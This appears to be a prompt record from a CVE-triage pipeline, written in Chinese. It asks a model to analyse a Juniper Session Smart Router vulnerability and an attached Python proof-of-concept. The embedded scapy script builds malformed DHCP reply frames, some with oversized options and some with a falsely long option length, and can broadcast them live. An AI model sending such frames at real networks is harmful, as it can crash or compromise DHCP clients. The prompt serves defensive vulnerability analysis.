    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-103409\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"A Missing authentication for critical function vulnerability in Juniper Networks Session Smart Router allows an unauthenticated network-based attacker to obtain administrative privileges by passing crafted URL parameters to an insecure endpoint running as root.\\n\\nNote that this vulnerability can only be exploited prior to the device being onboarded to Mist/Conductor. The issue can no longer be exploited once a device is onboarded to Mist/Conductor.\", \"\\u6807\\u9898: Juniper SSR \\u8ba4\\u8bc1\\u7f3a\\u5931\\u63d0\\u6743\\u6f0f\\u6d1e\"], \"published_date\": \"2026-10-28T17:17:27.840\", \"last_modified_date\": \"2026-10-28T17:17:28.083\", \"cvss_score\": 9.8, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"s\", \"u\", \"p\", \"p\", \"o\", \"r\", \"t\", \"p\", \"o\", \"r\", \"t\", \"a\", \"l\", \".\", \"j\", \"u\", \"n\", \"i\", \"p\", \"e\", \"r\", \".\", \"n\", \"e\", \"t\", \"/\", \"J\", \"S\", \"A\", \"1\", \"1\", \"2\", \"1\", \"8\", \"3\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2026-103409 - Session Smart Router: An attacker obtains ...\n [description] The following table lists the changes that have been made to the CVE-2026-103409 vulnerability over time. Vulnerability history details can be useful for understanding the evolution of a vulnerability, and for identifying the most recent changes that may impact the vulnerability's severity, exploitability, or other characteristics.\n [link] https://cvefeed.io/vuln/detail/CVE-2026-103409\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-103409: Session Smart Router Vulnerability | CVETodo\n [description] CVE-2026-103409: Missing Authentication for Critical Function in Session Smart Router. See exploitation status, patch guidance, and technical details.\n [link] https://cvetodo.com/cve/CVE-2026-103409\n [webpage 1 end]\n[webpage 2 begin] [title] GitHub - 0xMarcio/pocindex: Search public CVE proof-of-concept exploits ...\n [description] PoC Index: Search public CVE proof-of-concept exploits from GitHub, Nuclei, ExploitDB, Metasploit and Vulhub, with CVSS, EPSS and CISA KEV context. Find exploits by CVE, vendor, product or keyword.\n [link] https://github.com/0xMarcio/pocindex\n [webpage 2 end]\n[webpage 3 begin] [title] Nvd-cve-2026-103409\n [description] Description A Missing authentication for critical function vulnerability in Juniper Networks Session Smart Router allows an unauthenticated network-based attacker to obtain administrative privileges by passing crafted URL parameters to an insecure endpoint running as root.\n [link] https://nvd.nist.gov/vuln/detail/cve-2026-103409\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-103409 - Vulnerability Details - OpenCVE\n [description] A Missing authentication for critical function vulnerability in Juniper Networks Session Smart Router allows an unauthenticated network-based attacker to obtain administrative privileges by passing crafted URL parameters to an insecure endpoint running as root.\n [link] https://app.opencve.io/cve/CVE-2026-103409\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/85b2243d4dd571b332c30438025033a4/01_dhcp_replay.py\n---\n#!/usr/bin/env python3\n\"\"\"\ndhcp_replay.py - craft the malformed DHCP-reply shapes named in JSA112183.\n\nJSA112183 (Juniper Session Smart Router / Conductor, 2026-10-28) includes:\n\n  CVE-2026-103408 - stack buffer overflow in the SSR DHCP client\n                    (remote code execution via a malicious DHCP reply)\n  CVE-2026-103411 - integer underflow in DhcpMessageDecoder\n                    (information disclosure and denial of service)\n\nJuniper does not publish the vulnerable parser internals, so this tool does\nNOT claim to reproduce the actual SSR crash. It builds the generic anomaly\nshapes those CWE classes describe (CWE-121, CWE-191) so that you can:\n\n  - validate that your DHCP-side monitoring flags such replies\n  - rehearse the delivery path against your own lab DHCP clients\n  - inspect the frames byte-by-byte (hexdump mode)\n\nModes:\n  --shape NAME       overflow | underflow | benign (default: overflow)\n  --demo-pcap FILE   build the frame and write it to a pcap. No root needed.\n  -i IFACE           send live on the given interface (needs root)\n  --hexdump          print the full frame hexdump\n\nExamples:\n  python3 dhcp_replay.py --shape overflow --demo-pcap overflow.pcap --hexdump\n  sudo python3 dhcp_replay.py --shape underflow -i eth0\n\nRequires: scapy (pip install scapy)\n\"\"\"\n\nimport argparse\nimport sys\n\ntry:\n    from scapy.all import (  # noqa: F401\n        BOOTP, DHCP, Ether, IP, UDP, hexdump, raw, wrpcap,\n    )\nexcept ImportError:\n    sys.exit(\"scapy is required: pip install scapy\")\n\n# DHCP constants\nBOOTREPLY = 2\nOFFER = 2\nDHCP_MAGIC = b\"\\x63\\x82\\x53\\x63\"\n# RFC 2131: the options field of a BOOTP/DHCP packet has a fixed area of\n# 312 bytes. Replies that run far past that are anomalous.\nDHCP_OPTIONS_AREA_MAX = 312\n\n\ndef build_base_frame(mac_client, ip_client, ip_server, extra_options):\n    eth = Ether(dst=\"ff:ff:ff:ff:ff:ff\", src=\"02:00:00:aa:bb:01\", type=0x0800)\n    ip = IP(src=ip_server, dst=\"255.255.255.255\", id=0x4142, ttl=64)\n    udp = UDP(sport=67, dport=68)\n    bootp = BOOTP(\n        op=BOOTREPLY,\n        htype=1,\n        hlen=6,\n        xid=0x1A2B3C4D,\n        secs=0,\n        flags=0x8000,  # broadcast flag: reply goes to 255.255.255.255:68\n        yiaddr=ip_client,\n        siaddr=ip_server,\n        chaddr=bytes.fromhex(mac_client.replace(\":\", \"\")) + b\"\\x00\" * 10,\n    )\n    dhcp = DHCP(options=extra_options)\n    return eth / ip / udp / bootp / dhcp\n\n\ndef frame_overflow(mac_client, ip_client, ip_server):\n    \"\"\"\n    Shape 1 (CVE-2026-103408 class): an OFFER whose options area blows far\n    past the 312-byte BOOTP vendor area. A parser copying option payloads\n    into fixed stack buffers must bounds-check against what actually fits,\n    not against the option length bytes.\n    \"\"\"\n    frame = build_base_frame(\n        mac_client, ip_client, ip_server,\n        [(\"message-type\", OFFER), (\"server_id\", ip_server), (\"lease_time\", 86400), \"end\"],\n    )\n    # scapy caps the options area, so the oversized TLVs are appended to the\n    # raw BOOTP payload by hand and the packet is rebuilt afterwards.\n    tlv_url = bytes([114, 0xFF]) + b\"B\" * 0xFF              # code 114, 255 bytes\n    tlv_vendor = bytes([43, 0xFF]) + (bytes(range(0x43, 0x100)) * 3)[:0xFF]\n    tlv_host = bytes([12, 0xC8]) + b\"C\" * 0xC8              # hostname, 200 bytes\n    oversized = tlv_url + tlv_vendor + tlv_host             # 735 bytes of options\n    return _patch_options(frame, oversized)\n\n\ndef frame_underflow(mac_client, ip_client, ip_server):\n    \"\"\"\n    Shape 2 (CVE-2026-103411 class): a reply whose final option length byte\n    claims more bytes than the frame actually contains. A decoder that\n    trusts the length field and walks the claimed span reads past the end\n    of the buffer: the classic integer-underflow pattern.\n    \"\"\"\n    frame = build_base_frame(\n        mac_client, ip_client, ip_server,\n        [(\"message-type\", OFFER), (\"server_id\", ip_server), (\"lease_time\", 86400), \"end\"],\n    )\n    # code 114 claims 0x20 bytes but carries only 2\n    truncated = bytes([114, 0x20, 0x41, 0x42])\n    return _patch_options(frame, truncated)\n\n\ndef _patch_options(frame, replacement_options):\n    \"\"\"\n    Replace the end-of-options marker with the given raw TLV stream (followed\n    by a fresh end marker), then reserialize so IP/UDP lengths and checksums\n    are recomputed over the patched BOOTP payload.\n    \"\"\"\n    data = bytearray(raw(frame))\n    idx = data.find(DHCP_MAGIC)\n    if idx < 0:\n        sys.exit(\"DHCP magic cookie not found in frame\")\n    if data[-1] != 0xFF:\n        sys.exit(\"expected scapy end-of-options marker at frame end\")\n    data[-1:] = replacement_options + b\"\\xff\"\n    udp_hdr = UDP(data[34:42])\n    return Ether(data[:14]) / IP(data[14:34]) / UDP(\n        sport=udp_hdr.sport, dport=udp_hdr.dport\n    ) / bytes(data[42:])\n\n\ndef frame_benign(mac_client, ip_client, ip_server):\n    \"\"\"A compliant OFFER, used as a false-positive control.\"\"\"\n    opts = [\n        (\"\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2. 